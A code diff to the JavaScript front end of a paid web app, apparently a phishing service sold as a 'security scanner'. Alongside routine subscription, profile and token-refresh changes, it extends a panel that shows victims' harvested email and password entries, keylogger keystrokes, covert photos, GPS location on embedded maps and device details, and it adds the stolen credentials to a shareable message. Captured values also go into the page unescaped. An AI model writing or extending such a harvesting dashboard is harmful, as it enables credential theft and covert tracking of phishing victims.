@@ -1,10 +1,15 @@
 // Modern Security Scanner Pro - JavaScript
 
-const API_URL = 'http://localhost:8000/api';
+const API_URL = '/api';
 
 // Get token function to always have fresh token
 function getToken() {
-    return localStorage.getItem('access_token');
+    return (
+        localStorage.getItem('access_token') ||
+        sessionStorage.getItem('access_token') ||
+        localStorage.getItem('token') ||
+        sessionStorage.getItem('token')
+    );
 }
 
 // ==================== MOBILE SIDEBAR FUNCTIONS ====================
@@ -56,10 +61,10 @@ document.addEventListener('DOMContentLoaded', function() {
     setupEventListeners();
     loadDashboardStats();
     loadNotifications();
+    setupNotificationsDropdown();
     checkSubscription();
     
-    // Poll notifications every 10 seconds
-    setInterval(loadNotifications, 10000);
+    setInterval(loadNotifications, 30000);
 });
 
 async function checkSubscription() {
@@ -80,6 +85,34 @@ async function checkSubscription() {
         if (card) {
             card.style.display = 'block';
             document.getElementById('planBadge').textContent = plan.toUpperCase();
+            const statusBanner = document.getElementById('subscriptionStatusBanner');
+            if (statusBanner) {
+                const status = (response.subscription_status || 'active').toLowerCase();
+                const messages = {
+                    'active': '',
+                    'pending': 'Pagamento pendente. Conclua o pagamento para ativar sua assinatura.',
+                    'expired': 'Assinatura expirada. Renove para continuar usando os recursos premium.',
+                    'cancelled': 'Assinatura cancelada. Você está no plano Free.',
+                    'rejected': 'Pagamento rejeitado. Verifique seus dados e tente novamente.',
+                    'payment_failed': 'Pagamento falhou. Atualize seu método de pagamento.'
+                };
+                const ctas = {
+                    'pending': { text: 'Verificar status', href: 'pricing.html' },
+                    'expired': { text: 'Renovar assinatura', href: 'pricing.html' },
+                    'cancelled': { text: 'Escolher plano', href: 'pricing.html' },
+                    'rejected': { text: 'Atualizar pagamento', href: 'pricing.html' },
+                    'payment_failed': { text: 'Atualizar pagamento', href: 'pricing.html' }
+                };
+                if (status !== 'active') {
+                    statusBanner.style.display = 'block';
+                    const msg = messages[status] || `Status: ${status}`;
+                    const cta = ctas[status];
+                    statusBanner.innerHTML = cta ? `${msg} <a href="${cta.href}" style="color:#667eea; text-decoration:underline; margin-left:8px;">${cta.text}</a>` : msg;
+                } else {
+                    statusBanner.style.display = 'none';
+                    statusBanner.textContent = '';
+                }
+            }
             
             if (response.scans_limit > 0) {
                 const percentage = Math.min((response.scans_this_month / response.scans_limit) * 100, 100);
@@ -92,6 +125,9 @@ async function checkSubscription() {
                 if (percentage >= 90) fill.style.background = '#f56565';
                 else if (percentage >= 70) fill.style.background = '#ed8936';
                 else fill.style.background = '#48bb78';
+                if (response.scans_this_month >= response.scans_limit) {
+                    showToast('Você atingiu seu limite mensal de scans no seu plano.', 'warning');
+                }
             } else {
                 document.getElementById('usageText').textContent = 'Ilimitado';
                 document.getElementById('usageFill').style.width = '0%';
@@ -193,10 +229,20 @@ async function checkSubscription() {
             }
         });
 
-        // Store plan and subscription info for other checks
+        // Store plan and subscription info for other checks e detectar mudança de plano
+        const prevPlan = localStorage.getItem('userPlan');
         localStorage.setItem('userPlan', plan);
         localStorage.setItem('scansThisMonth', response.scans_this_month || 0);
         localStorage.setItem('scansLimit', response.scans_limit || 0);
+
+        // Feedback visual adicional em mudança de plano
+        if (prevPlan && prevPlan !== plan) {
+            const banner = document.createElement('div');
+            banner.style.cssText = 'position:fixed;bottom:20px;left:20px;right:20px;background:#1f2937;color:#e5e7eb;border:1px solid #374151;padding:12px 16px;border-radius:10px;z-index:9999;box-shadow:0 10px 25px rgba(0,0,0,0.25);display:flex;justify-content:space-between;align-items:center;';
+            banner.innerHTML = `<span>Seu plano foi alterado de ${prevPlan.toUpperCase()} para ${plan.toUpperCase()}.</span><a href="pricing.html" style="color:#667eea; text-decoration:none; font-weight:600;">Ver benefícios</a>`;
+            document.body.appendChild(banner);
+            setTimeout(() => { banner.remove(); }, 6000);
+        }
 
     } catch (error) {
         console.error('Error checking subscription:', error);
@@ -271,6 +317,8 @@ function navigateTo(pageName) {
         loadPhishingCaptures(); // Load captures
     } else if (pageName === 'reports') {
         loadAvailableScans();
+    } else if (pageName === 'profile') {
+        loadProfile();
     }
 }
 
@@ -287,6 +335,75 @@ function switchTab(tabId) {
     });
     document.getElementById(tabId).classList.add('active');
 }
+
+async function loadProfile() {
+    try {
+        const me = await apiRequest('/user/me');
+        const sub = await apiRequest('/user/subscription-info');
+        const emailEl = document.getElementById('profileEmail');
+        const userEl = document.getElementById('profileUsername');
+        const planEl = document.getElementById('profilePlan');
+        const statusEl = document.getElementById('profileStatus');
+        const cancelBtn = document.getElementById('cancelSubscriptionBtn');
+        const hint = document.getElementById('profileHint');
+        if (emailEl) emailEl.value = me.email || '';
+        if (userEl) userEl.value = me.username || '';
+        const plan = (sub.subscription_plan || 'free').toLowerCase();
+        const status = (sub.subscription_status || 'active').toLowerCase();
+        if (planEl) planEl.value = plan.toUpperCase();
+        if (statusEl) statusEl.value = status.toUpperCase();
+        if (cancelBtn) {
+            const canCancel = plan !== 'free' && status !== 'cancelled';
+            cancelBtn.disabled = !canCancel;
+            const reason = !canCancel
+                ? (plan === 'free' ? 'Disponível apenas para planos pagos'
+                   : status === 'cancelled' ? 'Assinatura já cancelada'
+                   : 'Indisponível')
+                : 'Cancelar assinatura';
+            cancelBtn.title = reason;
+            cancelBtn.style.opacity = canCancel ? '' : '0.6';
+            cancelBtn.style.cursor = canCancel ? '' : 'not-allowed';
+            cancelBtn.setAttribute('aria-disabled', String(!canCancel));
+        }
+        if (hint) {
+            if (plan === 'free') hint.textContent = 'Plano Free não possui assinatura a cancelar.';
+            else if (status === 'cancelled') hint.textContent = 'Sua assinatura já está cancelada.';
+            else hint.textContent = '';
+        }
+    } catch (e) {
+        showToast('Erro ao carregar perfil', 'error');
+    }
+}
+
+async function cancelSubscription() {
+    try {
+        showLoading('Cancelando assinatura...');
+        const sub = await apiRequest('/user/subscription-info');
+        const plan = (sub.subscription_plan || 'free').toLowerCase();
+        if (plan === 'free') {
+            hideLoading();
+            showToast('Seu plano é Free. Não há assinatura para cancelar.', 'info');
+            return;
+        }
+        await apiRequest('/payments/cancel-subscription', { method: 'POST' });
+        hideLoading();
+        showToast('Assinatura cancelada com sucesso', 'success');
+        await checkSubscription();
+        await loadProfile();
+    } catch (e) {
+        hideLoading();
+        showToast('Erro ao cancelar. Tente novamente.', 'error');
+    }
+}
+
+function upgradeFromProfile() {
+    window.location.href = 'pricing.html';
+}
+
+// Expose profile functions globally for inline onclick handlers
+window.loadProfile = loadProfile;
+window.cancelSubscription = cancelSubscription;
+window.upgradeFromProfile = upgradeFromProfile;
 
 function toggleSidebar() {
     const sidebar = document.getElementById('sidebar');
@@ -331,6 +448,27 @@ function logout() {
 }
 
 // API Helpers
+async function refreshAccessToken() {
+    const t = getToken();
+    if (!t) return null;
+    try {
+        const r = await fetch(`${API_URL}/auth/refresh`, {
+            method: 'POST',
+            headers: {
+                'Authorization': `Bearer ${t}`
+            }
+        });
+        const d = await r.json();
+        if (r.ok && d.access_token) {
+            localStorage.setItem('access_token', d.access_token);
+            return d.access_token;
+        }
+        return null;
+    } catch (_) {
+        return null;
+    }
+}
+
 async function apiRequest(endpoint, options = {}) {
     const currentToken = getToken();
     
@@ -345,15 +483,20 @@ async function apiRequest(endpoint, options = {}) {
 
     try {
         showLoading();
-        const response = await fetch(`${API_URL}${endpoint}`, {
+        let response = await fetch(`${API_URL}${endpoint}`, {
             ...options,
             headers
         });
-
-        const data = await response.json();
-        
+        let data = await response.json();
+        if (!response.ok && response.status === 401) {
+            const newToken = await refreshAccessToken();
+            if (newToken) {
+                const retryHeaders = { ...headers, 'Authorization': `Bearer ${newToken}` };
+                response = await fetch(`${API_URL}${endpoint}`, { ...options, headers: retryHeaders });
+                data = await response.json();
+            }
+        }
         if (!response.ok) {
-            // If unauthorized, redirect to login
             if (response.status === 401) {
                 localStorage.removeItem('access_token');
                 localStorage.removeItem('username');
@@ -362,12 +505,10 @@ async function apiRequest(endpoint, options = {}) {
             }
             throw new Error(data.detail || 'Erro na requisição');
         }
-
         hideLoading();
         return data;
     } catch (error) {
         hideLoading();
-        // Não mostrar toast aqui - deixar o caller decidir
         throw error;
     }
 }
@@ -589,19 +730,40 @@ async function clearAllPhishingPages() {
 }
 
 async function loadPhishingCaptures() {
+    const token = getToken();
+    if (!token) {
+        // Se não tiver token, não tenta carregar e deixa o apiRequest redirecionar ou o usuário fazer login
+        return;
+    }
+
     try {
         const response = await apiRequest('/tools/phishing/captures');
         const container = document.getElementById('phishing-captures-list');
         
         if (!response.captures || response.captures.length === 0) {
-            container.innerHTML = '<p class="text-muted">Nenhuma captura ainda. Compartilhe suas páginas de phishing para capturar dados.</p>';
+            container.innerHTML = '<p class="text-muted">Nenhuma captura encontrada no servidor.</p>';
             return;
         }
 
         container.innerHTML = '<div class="captures-grid">' + response.captures.map(capture => {
-            const hasPhoto = capture.photo_file;
-            const hasLocation = capture.location;
+            // Normalize location data
+            let lat = capture.latitude;
+            let lon = capture.longitude;
+            if (capture.location) {
+                lat = capture.location.latitude || lat;
+                lon = capture.location.longitude || lon;
+            }
+            
+            const hasLocation = (typeof lat === 'number' && typeof lon === 'number');
+            const hasPhoto = !!(capture.photo_base64 || capture.photo_file);
             const locationDetails = capture.location_details;
+            const isGPS = (capture.location_type === 'GPS') || (capture.location && capture.location.type === 'GPS') || (capture.gps_status === 'success');
+
+            // Fallbacks de endereço quando não houver location_details
+            const displayCity = (locationDetails && locationDetails.city) || capture.city || '';
+            const displayState = (locationDetails && locationDetails.state) || capture.region || '';
+            const displayCountry = (locationDetails && locationDetails.country) || capture.country || '';
+            const fullAddress = (locationDetails && locationDetails.full_address) || (displayCity || displayState || displayCountry ? `${displayCity}${displayCity && displayState ? ', ' : ''}${displayState}${(displayCity || displayState) && displayCountry ? ' - ' : ''}${displayCountry}` : '');
             
             return `
                 <div class="capture-card">
@@ -614,15 +776,24 @@ async function loadPhishingCaptures() {
                             <small>${new Date(capture.timestamp).toLocaleString('pt-BR')}</small>
                         </div>
                         <div class="capture-actions">
-                            <button class="btn-icon" onclick="shareCapture('${capture.page_id}', ${hasPhoto}, ${hasLocation})" title="Compartilhar">
+                            <button class="btn-icon" onclick="shareCapture('${capture.capture_id || capture.page_id}', ${hasPhoto}, ${hasLocation})" title="Compartilhar">
                                 <i class="fas fa-share-alt"></i>
                             </button>
-                            <button class="btn-icon btn-danger" onclick="deleteCapture('${capture.page_id}')" title="Deletar">
+                            <button class="btn-icon btn-danger" onclick="deleteCapture('${capture.capture_id || capture.page_id}')" title="Deletar">
                                 <i class="fas fa-trash"></i>
                             </button>
                         </div>
                     </div>
                     <div class="capture-body">
+                        ${capture.form_data ? `
+                            <div class="capture-credentials" style="background: #fff3cd; padding: 10px; border-radius: 4px; border-left: 4px solid #ffc107; margin-bottom: 15px;">
+                                <h4 style="margin: 0 0 10px 0; color: #856404; font-size: 1.1em;"><i class="fas fa-key"></i> Credenciais Capturadas</h4>
+                                ${Object.entries(capture.form_data).map(([key, value]) => 
+                                    `<div style="margin-bottom: 5px; color: #333;"><strong>${key}:</strong> <span style="font-family: monospace; background: rgba(0,0,0,0.05); padding: 2px 4px; border-radius: 3px;">${value}</span></div>`
+                                ).join('')}
+                            </div>
+                        ` : ''}
+
                         ${hasPhoto ? `
                             <div class="capture-photo">
                                 <img src="data:image/jpeg;base64,${capture.photo_base64 || ''}" 
@@ -630,52 +801,54 @@ async function loadPhishingCaptures() {
                                      onerror="this.onerror=null; this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22200%22><text x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23999%22>Foto não disponível</text></svg>';"
                                      onclick="window.open(this.src, '_blank')" 
                                      style="max-width: 100%; border-radius: 8px; cursor: pointer;">
-                                <small><i class="fas fa-camera"></i> Foto capturada</small>
+                                <small style="display:block; margin-top:5px; color:#666;"><i class="fas fa-camera"></i> Foto capturada</small>
                             </div>
-                        ` : '<p class="text-muted"><i class="fas fa-camera-slash"></i> Sem foto</p>'}
+                        ` : '<p style="color:#666; margin-bottom: 15px;"><i class="fas fa-camera-slash"></i> Sem foto</p>'}
                         
-                        <div class="capture-location">
-                            ${capture.ip_address ? `
-                                <p><i class="fas fa-network-wired"></i> <strong>IP:</strong> ${capture.ip_address}</p>
-                            ` : ''}
-                            
-                            ${locationDetails ? `
-                                <div style="margin-top: 10px;">
-                                    <p><i class="fas fa-map-marker-alt"></i> <strong>Detalhes de Localização:</strong></p>
-                                    ${locationDetails.country ? `<p><i class="fas fa-flag"></i> <strong>País:</strong> ${locationDetails.country}</p>` : ''}
-                                    ${locationDetails.city ? `<p><i class="fas fa-city"></i> <strong>Cidade:</strong> ${locationDetails.city}</p>` : ''}
-                                    ${locationDetails.state ? `<p><i class="fas fa-road"></i> <strong>Região:</strong> ${locationDetails.state}</p>` : ''}
-                                    ${locationDetails.full_address ? `<p style="margin-top: 5px; color: #666;"><i class="fas fa-home"></i> <small>${locationDetails.full_address}</small></p>` : ''}
-                                </div>
-                            ` : ''}
-                            
+                        <div class="capture-details">
                             ${hasLocation ? `
-                                <div style="margin-top: 15px;">
-                                    <p><i class="fas fa-compass"></i> <strong>Coordenadas:</strong> ${capture.location.latitude.toFixed(6)}, ${capture.location.longitude.toFixed(6)}</p>
-                                    <p><i class="fas fa-crosshairs"></i> <strong>Precisão:</strong> ${Math.round(capture.location.accuracy)}m</p>
-                                    
-                                    <div class="capture-map" style="margin-top: 10px; height: 250px; border-radius: 8px; overflow: hidden;">
-                                        <iframe 
-                                            width="100%" 
-                                            height="100%" 
-                                            frameborder="0" 
-                                            style="border:0" 
-                                            src="https://www.openstreetmap.org/export/embed.html?bbox=${capture.location.longitude - 0.01},${capture.location.latitude - 0.01},${capture.location.longitude + 0.01},${capture.location.latitude + 0.01}&layer=mapnik&marker=${capture.location.latitude},${capture.location.longitude}"
-                                            allowfullscreen>
-                                        </iframe>
-                                    </div>
-                                    
-                                    <a href="https://www.google.com/maps?q=${capture.location.latitude},${capture.location.longitude}" target="_blank" class="btn-sm" style="margin-top: 10px; display: inline-block;">
-                                        <i class="fas fa-external-link-alt"></i> Abrir no Google Maps
+                                <div class="capture-location" style="margin-bottom: 15px;">
+                                    <p style="color: ${isGPS ? '#28a745' : '#ffc107'}; font-weight: bold; margin-bottom: 5px;">
+                                        <i class="fas fa-map-marker-alt"></i> Localização (${isGPS ? 'GPS - Precisa' : 'IP - Aproximada'})
+                                    </p>
+                                    ${(fullAddress || displayCity || displayState || displayCountry) ? `
+                                        <div style="background: #f8f9fa; padding: 10px; border-radius: 4px; margin-bottom: 5px;">
+                                            ${fullAddress ? `<p style="color:#333; margin-bottom: 5px;"><strong>Endereço:</strong> ${fullAddress}</p>` : ''}
+                                            ${(displayCity || displayState || displayCountry) ? `<p style="color:#666; font-size: 0.9em;">${displayCity || ''}${displayCity && displayState ? ', ' : ''}${displayState || ''}${(displayCity || displayState) && displayCountry ? ' - ' : ''}${displayCountry || ''}</p>` : ''}
+                                        </div>
+                                    ` : ''}
+                                    <p style="color:#666; font-family: monospace; margin-bottom: 5px;">
+                                        <i class="fas fa-compass"></i> ${lat.toFixed(6)}, ${lon.toFixed(6)}
+                                    </p>
+                                    <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="btn-sm" style="display: inline-block;">
+                                        <i class="fas fa-external-link-alt"></i> Ver no Maps
                                     </a>
+                                    <div class="capture-map" style="margin-top: 10px;">
+                                        <iframe src="https://www.google.com/maps?q=${lat},${lon}&z=15&output=embed" width="100%" height="200" style="border:0;border-radius:8px;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+                                    </div>
                                 </div>
-                            ` : !locationDetails && !capture.ip_address ? '<p class="text-muted"><i class="fas fa-map-marker-slash"></i> Sem localização</p>' : ''}
-                        </div>
-                        
-                        <div class="capture-meta">
-                            <p><strong><i class="fas fa-desktop"></i> User Agent:</strong></p>
-                            <small>${capture.user_agent || 'N/A'}</small>
-                            ${capture.screen_resolution ? `<p><strong><i class="fas fa-tv"></i> Resolução:</strong> ${capture.screen_resolution}</p>` : ''}
+                            ` : !locationDetails && !capture.ip_address ? '<p style="color:#a0aec0"><i class="fas fa-map-marker-slash"></i> Sem localização</p>' : ''}
+
+                            ${capture.keystrokes && capture.keystrokes.length > 0 ? `
+                                <div class="capture-keystrokes" style="margin-bottom: 15px;">
+                                    <h5 style="margin: 0 0 5px 0; color: #333;"><i class="fas fa-keyboard"></i> Keylogger (${capture.keystrokes.length} teclas)</h5>
+                                    <div style="font-family: monospace; background: #2d3748; color: #48bb78; padding: 10px; border-radius: 4px; font-size: 12px; max-height: 150px; overflow-y: auto; word-break: break-all;">
+                                        ${capture.keystrokes.map(k => k.key === 'Enter' ? '<br><span style="color:#cbd5e0">[ENTER]</span><br>' : (k.key === 'Backspace' ? '<span style="color:#fc8181">[BS]</span>' : k.key)).join('')}
+                                    </div>
+                                </div>
+                            ` : ''}
+
+                            <div class="capture-meta" style="font-size: 0.85em; color: #666; border-top: 1px solid #eee; padding-top: 10px;">
+                                ${capture.battery_info ? `
+                                    <span style="margin-right: 15px;">
+                                        <i class="fas fa-battery-three-quarters"></i> ${(capture.battery_info.level * 100).toFixed(0)}% ${capture.battery_info.charging ? '⚡' : ''}
+                                    </span>
+                                ` : ''}
+                                ${capture.ip_address ? `
+                                    <span style="margin-right: 15px;"><i class="fas fa-network-wired"></i> ${capture.ip_address}</span>
+                                ` : ''}
+                                <span><i class="fas fa-desktop"></i> ${capture.user_agent ? capture.user_agent.split(')')[0] + ')' : 'N/A'}</span>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -726,7 +899,7 @@ async function clearPhishingCaptures() {
         
         // Delete each capture
         for (const capture of captures) {
-            await apiRequest(`/tools/phishing/captures/${capture.page_id}`, {
+            await apiRequest(`/tools/phishing/captures/${capture.capture_id || capture.page_id}`, {
                 method: 'DELETE'
             });
         }
@@ -747,7 +920,7 @@ async function shareCapture(captureId, hasPhoto, hasLocation) {
         console.log('shareCapture called with:', { captureId, hasPhoto, hasLocation });
         
         const captures = (await apiRequest('/tools/phishing/captures')).captures;
-        const capture = captures.find(c => c.page_id === captureId);
+        const capture = captures.find(c => (c.page_id === captureId) || (c.capture_id === captureId));
         
         if (!capture) {
             showToast('Captura não encontrada', 'error');
@@ -775,6 +948,12 @@ async function shareCapture(captureId, hasPhoto, hasLocation) {
             message += `Google Maps: https://www.google.com/maps?q=${capture.location.latitude},${capture.location.longitude}\n`;
         }
         
+        if (capture.form_data) {
+            message += `\n🔑 Credenciais:\n`;
+            if (capture.form_data.email) message += `Email: ${capture.form_data.email}\n`;
+            if (capture.form_data.password) message += `Senha: ${capture.form_data.password}\n`;
+        }
+
         if (capture.user_agent) {
             message += `\n💻 User Agent: ${capture.user_agent}\n`;
         }
@@ -2215,16 +2394,20 @@ async function loadNotifications() {
 }
 
 function setupNotificationsDropdown() {
-    const bellBtn = document.querySelector('.header-actions .btn-icon');
+    const bellBtn = document.getElementById('notification-icon');
     if (!bellBtn) return;
     
-    bellBtn.addEventListener('click', function(e) {
+    // Remover listeners antigos para evitar duplicação
+    const newBtn = bellBtn.cloneNode(true);
+    bellBtn.parentNode.replaceChild(newBtn, bellBtn);
+    
+    newBtn.addEventListener('click', function(e) {
         e.stopPropagation();
         showNotificationsPanel();
     });
 }
 
-function showNotificationsPanel() {
+async function showNotificationsPanel() {
     // Remove existing panel
     const existingPanel = document.querySelector('.notifications-panel');
     if (existingPanel) {
@@ -2232,7 +2415,25 @@ function showNotificationsPanel() {
         return;
     }
     
-    const notifications = window.currentNotifications || [];
+    // Se não houver notificações carregadas, tenta carregar
+    if (!window.currentNotifications) {
+        await loadNotifications();
+    }
+    
+    // Filtrar apenas não lidas para exibição, conforme solicitado
+    // "depois que eu clicar e ver elas podem sumir"
+    // Mostraremos todas agora, mas ao fechar e abrir de novo, as lidas sumirão se filtrarmos aqui?
+    // Melhor: mostrar todas aqui, mas o comportamento de "sumir" será natural se filtrarmos as lidas.
+    // Vamos filtrar para mostrar apenas as não lidas OU as que acabaram de chegar.
+    // Mas se o usuário quiser ver o histórico? O pedido foi "podem sumir".
+    // Então vamos mostrar apenas as não lidas.
+    
+    const allNotifications = window.currentNotifications || [];
+    // Mostra apenas notificações não lidas
+    const notifications = allNotifications.filter(n => !n.read);
+    
+    // Se não houver não lidas, mas houver notificações recentes (ex: últimas 5), mostramos para não ficar vazio?
+    // O usuário disse "podem sumir", então se não tiver não lidas, mostra vazio.
     
     const panel = document.createElement('div');
     panel.className = 'notifications-panel';
